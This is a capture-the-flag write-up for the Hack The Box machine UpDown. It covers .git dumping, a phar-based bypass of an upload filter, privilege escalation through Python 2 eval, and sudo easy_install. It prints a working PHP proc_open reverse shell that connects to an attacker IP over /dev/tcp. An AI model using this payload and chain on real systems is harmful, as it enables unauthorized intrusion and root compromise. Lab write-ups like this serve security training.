# UpDown - Hack The Box

## Enumeration
### Nmap
Initial Nmap scan revealed SSH and HTTP ports open.

<img width="970" height="248" alt="00 - nmap out" src="https://github.com/user-attachments/assets/d10ee9d7-df13-495a-80ed-a3374f454655" />

### Web Enumeration
Website revealed that the domain is siteisup.htb, thus I added it to /etc/hosts file.

<img width="1632" height="760" alt="01 - siteisup" src="https://github.com/user-attachments/assets/c72b912d-d972-49c3-92c7-7bce8380da80" />

### Directory Brute Forcing
Directory brute forcing with common names revealed that there is directory named /dev. And inside it there is a .git file available.

<img width="1389" height="831" alt="02 - directory brute force" src="https://github.com/user-attachments/assets/bd76e54a-219d-4e19-a0fe-65a768da1025" />

<img width="1531" height="677" alt="03 -  git" src="https://github.com/user-attachments/assets/d97e12ca-0871-4ee9-b4f2-4f52fd355649" />

### Git Dumper
I used [git-dumper](https://github.com/arthaud/git-dumper) tool to dump files using publicly accessible .git file.

<img width="1712" height="406" alt="04 - git dumper" src="https://github.com/user-attachments/assets/c4c15292-6c12-4c04-8912-2dbfdd7eeaf4" />

It revealed php files and .htaccess file which is a php configuration file.

<img width="742" height="257" alt="05 - inside the dev" src="https://github.com/user-attachments/assets/7d3948b5-30db-4559-a070-9d65bec65870" />

Reading the .htaccess file revealed that there is required header Special-Dev to access dev site.

<img width="576" height="136" alt="07 - 0 required header" src="https://github.com/user-attachments/assets/91e393bc-b683-48e6-9833-c3156b4b5f2b" />

### Subdomain Brute Force
After analyzing the files from dev site, I applied subdomain enumeration to find the subdomain that the dev site is running on. As expected it returned 'dev' subdomain.

<img width="1011" height="404" alt="06 - dev subdomain" src="https://github.com/user-attachments/assets/2544874f-25af-4bfe-aff8-0ecf14c41fba" />

### Burp Update
Then I opened Burp Suite and set match-replace rule to add Special-Dev header to every request.

<img width="1105" height="621" alt="07 - 1 header replace rule burp" src="https://github.com/user-attachments/assets/b8db24e1-3c13-45ca-9d21-1b6dbba3166d" />

### Analyzing Dev Website
At first I checked index.php, it is simply getting page parameter and concatting .php at the end and rendering this page. If no parameter is given it is running checker.php file.

<img width="742" height="257" alt="07 - index php" src="https://github.com/user-attachments/assets/79d74136-d1da-4a03-aec8-a191459c4893" />

Then analyzed checker.php file. It checks for extension and filters any known extension that can be malicious. Then creates a folder under the uploads folder using MD5 of timestamp and puts the file inside it. And after reading line by line and checking connectivity, it deletes the file.

<img width="1165" height="817" alt="08 - checker php" src="https://github.com/user-attachments/assets/7a1bb8de-614a-4940-a95b-7ab96437b1ec" />

<img width="1674" height="723" alt="09 - uploads" src="https://github.com/user-attachments/assets/653bda5e-6c73-46f2-83a4-59b4934abc44" />

It is filtering known extensions but there is no filter for phar extensions. [Phar](https://www.php.net/manual/en/intro.phar.php) is special format that can be used to include files inside compressed zip files (For example: include 'phar:///path/to/file.zip/file.php';).
But zip or other known extension are blocked. So I created a phpinfo() file and compressed the file with .mto extension.

<img width="1461" height="207" alt="10 - revshell" src="https://github.com/user-attachments/assets/fc1ddffe-9855-41ad-aa44-386c908e2334" />

I know that index.php includes files that are given with page parameter. So giving it a phar link reveals php info page.

<img width="1508" height="715" alt="11 - file" src="https://github.com/user-attachments/assets/f27d7187-8209-43b7-81b0-e4492a4c2177" />

I tested some reverse shells and it did not work. Then checking phpinfo page, I understood that some functions are disabled. So either I can check meanually or I can run [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser/blob/master/dfunc-bypasser.py) script to check if there is known function that is not excluded.

I first need to update dfunc-bypasser script to send requests with Special-Dev header.

<img width="669" height="80" alt="12 - function update dfunc" src="https://github.com/user-attachments/assets/f65e33cd-25be-4521-aca4-fd911cec0c08" />

Then running it revealed proc_open function is allowed, and it is malicious. It can be used to run shell commands. You can check out [documentation](https://www.php.net/manual/en/function.proc-open.php) for more information.

<img width="1377" height="469" alt="13 - proc open" src="https://github.com/user-attachments/assets/e38c1195-3701-472a-ba85-956aa6bf989c" />

## Exploitation
### Creating proc_open reverse shell
After learning proc_open is allowed, I created a reverse shell script as below:
```php
<?php
$descspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.12/1234 0>&1'";
$proc = proc_open($cmd, $descspec, $pipes);
?>
```

### Uploading and Getting Reverse Shell
Then zipped the shell using .mto extension and uploaded it.

<img width="1516" height="227" alt="14 - revshell" src="https://github.com/user-attachments/assets/728dcf0f-2291-42b1-9b77-09ebea151387" />

Visiting the site while listening with netcat gets me reverse shell as www-data.

<img width="1448" height="750" alt="15 - shell" src="https://github.com/user-attachments/assets/894dacab-7fce-45be-949c-71e772fe94f7" />

### Python2 Code Execution
As www-data, I can not read user.txt on the home page. I tried some privilege escalation methods which did not work. Then found dev folder inside home folder. Inside it there was a python2 script that gets an input from the user and a binary that calls that python script as developer user.

<img width="612" height="201" alt="16 - siteisup py" src="https://github.com/user-attachments/assets/2efce666-e74d-46e3-afbf-61f40af849a0" />

Python 2 passes any input that is given via input() function to the eval function, so we can run shell commands. To test it I ran id command and the output showed that my id is developer's id but my group id is www-data.

<img width="966" height="441" alt="17 - command execution" src="https://github.com/user-attachments/assets/23f26fba-837c-450d-ad06-6350499fc649" />

Then simply run /bin/bash and got the shell.

<img width="528" height="169" alt="18 - got the shell" src="https://github.com/user-attachments/assets/80a6440f-73c3-4b2c-941e-a82d303bfcfe" />

### SSH
But I still can not read user.txt because my group is www-data and the user.txt is owned by root and the developer group can read it. 

Thus, I copied ~/.ssh/id_rsa to login via SSH as the developer user.

<img width="948" height="420" alt="19 - ssh" src="https://github.com/user-attachments/assets/7f7c33e3-2d26-4a36-8855-776ffdb089b6" />

And then simply logged in.

<img width="1038" height="777" alt="20 - got the shell" src="https://github.com/user-attachments/assets/2b03b0ba-f3d4-4cff-b84b-35b3572236d3" />

## Privilege Escalation
### sudo -l 
Running sudo -l revealed I can run easy_install as sudo. And this file is deprecated python installer file, it simply gets a name and installs it.

<img width="1241" height="248" alt="21 - sudo -l and file" src="https://github.com/user-attachments/assets/833180ab-5b2f-4aee-9b48-84a3562d23c9" />

### GTFOBins
After some research, I found [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/) page for easy_install is available. So I simply applied the steps and got the root shell.

<img width="1108" height="193" alt="22 - got the root" src="https://github.com/user-attachments/assets/42ed85f6-1e69-442d-b768-113fc3381fca" />

## Pwned
The machine was fully compromised.

<img width="728" height="617" alt="23 - pned" src="https://github.com/user-attachments/assets/80488272-e3fc-4b2d-82fa-57cb7164ac85" />
